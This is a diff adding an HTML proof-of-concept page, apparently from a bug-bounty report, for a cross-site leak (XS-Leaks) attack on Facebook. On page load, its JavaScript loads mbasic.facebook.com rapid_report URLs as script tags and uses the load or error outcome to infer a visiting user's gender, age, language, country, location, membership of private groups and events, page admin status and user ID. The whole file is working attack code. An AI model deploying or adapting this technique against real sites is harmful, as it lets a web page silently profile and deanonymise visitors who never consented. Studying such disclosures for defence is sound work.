@@ -1,0 +1,114 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Leaking a Facebook user's private information through an XSLeaks attack involving different status codes</title>	
+	<link rel="stylesheet" href="bootstrap.min.css">
+	<link rel="stylesheet" href="styles.css">
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
+	<script>
+
+		const counter = 0
+
+		let posts = ["107262447322405", "107273860654597", "107275707321079", "107276150654368", "107276330654350", "107284120653571", "107284383986878", "107289783986338", "916817118718568", "2372753592995805", "374079856841401", "928392810830163", "107317783983538", "100041005852457", "100040257734979"];
+		
+		const basicMessages = [
+			`Is user adminstrator of Page ID: ${posts[0]}? `,
+			'Is the user "Male"?: ',
+			'Is the user\'s language set as English?',
+			'Is the user\'s country Brazil?',
+			'Is the user\'s country the United States?',
+			'Is the user 16 years old?',
+			'Is the user\'s language set as French?',
+			'Is the user 17 years old?',
+			`Is user a member in the private event with ID ${posts[8]}? `,
+			`Is user a member in the private event with ID ${posts[9]}? `,
+			`Is user a member of the private group with ID ${posts[10]}? `,
+			`Is user a member of the private group with ID ${posts[11]}? `,
+			'Is the user currently in the Santa Catarina state? ',
+			`Does the user accessing have ID ${posts[13]}?`,
+			`Does the user accessing have ID ${posts[14]}?`
+		]
+		
+		const type = [
+			['User is the adminstrator of the Page', 'User is NOT the adminstrator of the Page'],
+			['Yes, the user is \"Male\"', 'No, the user is \"Female\"'],
+			['Language is set as English', 'Language is NOT set as English'],
+			['User\'s country is Brazil', 'User\'s country is not Brazil'],
+			['User\'s country is the United States', 'User\'s country is not the United States'],
+			['User is 16 years old', 'User is not 16 years old'],
+			['Language is set as French', 'Language is NOT set as French'],
+			['User is 17 years old', 'User is not 17 years old'],
+			['User is in the private event', 'User is NOT in the private event'],
+			['User is in the private event', 'User is NOT in the private event'],
+			['User is member of the private group', 'User is NOT member of the private group'],
+			['User is member of the private group', 'User is NOT member of the private group'],
+			['User is currently in Santa Catarina (State)', 'User is NOT currently in Santa Catarina (State)'],
+			['User ID does match', 'User ID does not match'],
+			['User ID does match', 'User ID does not match']
+		]
+
+
+		onload = () => {
+			checkReport(posts.shift(), 0);
+		}
+
+
+	    checkReport = (itemId, counter) => {
+	        let script = document.createElement("script");
+	        script.src = `https://mbasic.facebook.com/rapid_report/?context={"reportable_ent_token":${itemId}}`;
+	        
+	        script.onload = () => {
+	        	console.log(counter)
+	        	if (counter == 0 || counter == 13 || counter == 14) {
+	            	showResult(false, counter);
+	        	} else {
+	        		showResult(true, counter);
+	        	}
+	        }
+	        script.onerror = () => {
+	        	console.log(counter)
+	        	if (counter == 0 || counter == 13 || counter == 14) {
+	        		showResult(true, counter);
+	        	} else {
+	        		showResult(false, counter);
+	        	}
+	        }
+	        document.body.appendChild(script);
+	    }
+
+	
+	    showResult = (result, counter) => {
+	    	if (result) {
+	    	
+	    		document.getElementById("knownHandler").innerHTML += `${!Array.isArray(basicMessages[counter]) ? basicMessages[counter] : basicMessages[counter][0]} <span style="color:green;">"${!Array.isArray(type[counter]) ? type[counter] : type[counter][0] }</span>".</br></br>`;
+	    	} else {
+	    		document.getElementById("knownHandler").innerHTML += `${!Array.isArray(basicMessages[counter]) ? basicMessages[counter] : basicMessages[counter][1]} "<span style="color:red;">${!Array.isArray(type[counter]) ? type[counter] : type[counter][1] }"</span>.</br></br>`;
+
+	    	}
+
+	        if (posts.length != 0) {
+	        	checkReport(posts.shift(), ++counter);
+	        }
+	    }
+	</script>
+</head>
+
+<body>
+    <div class="container">
+	    <section>
+			<div class="row">
+			    <div class="span16">
+			    	<div class="page-header">
+				        <h1>Leaking a Facebook user's private information</h1>
+				    </div>
+			      	</br>
+			        <h3 style="color: white;">Automatic result:</h3>
+			        <div id="knownHandler" class="outputStatus"></div>
+					
+			    </div>
+			</div>
+		</section>
+	</div>
+</body>
+</html>
